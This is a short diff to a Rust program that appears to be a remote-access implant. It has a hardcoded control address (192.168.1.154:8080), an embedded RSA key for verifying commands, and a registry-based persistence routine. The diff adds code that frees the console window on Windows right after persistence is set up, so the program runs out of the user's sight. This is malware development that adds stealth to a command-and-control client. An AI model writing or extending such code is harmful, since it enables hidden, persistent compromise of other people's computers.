@@ -14,6 +14,8 @@ use tokio::time::{sleep, Duration};
 use winreg::enums::*;
 use winreg::RegKey;
 
+pub mod console;
+
 const CONTROL: &str = "192.168.1.154:8080";
 const RSA_PUB_PEM: &str = "-----BEGIN RSA PUBLIC KEY-----
 MIIBCgKCAQEA1KBXWBk/GxsfTWhKTSUp7SB/M+cE9vQHVYaeRgtzN4t430JbmUbU
@@ -27,6 +29,10 @@ ghP0P975jWSP2sHbRdtXSei7zb4baGOiOe/7mH1/xUSGmxyHuQlc0haOGUXC7jxT
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
     get_persistence().await;
+
+    if cfg!(target_os = "windows") {
+        console::free();
+    }
 
     let public_key = RsaPublicKey::from_pkcs1_pem(RSA_PUB_PEM).unwrap();
     let verify_key = VerifyingKey::<Sha256>::new(public_key);
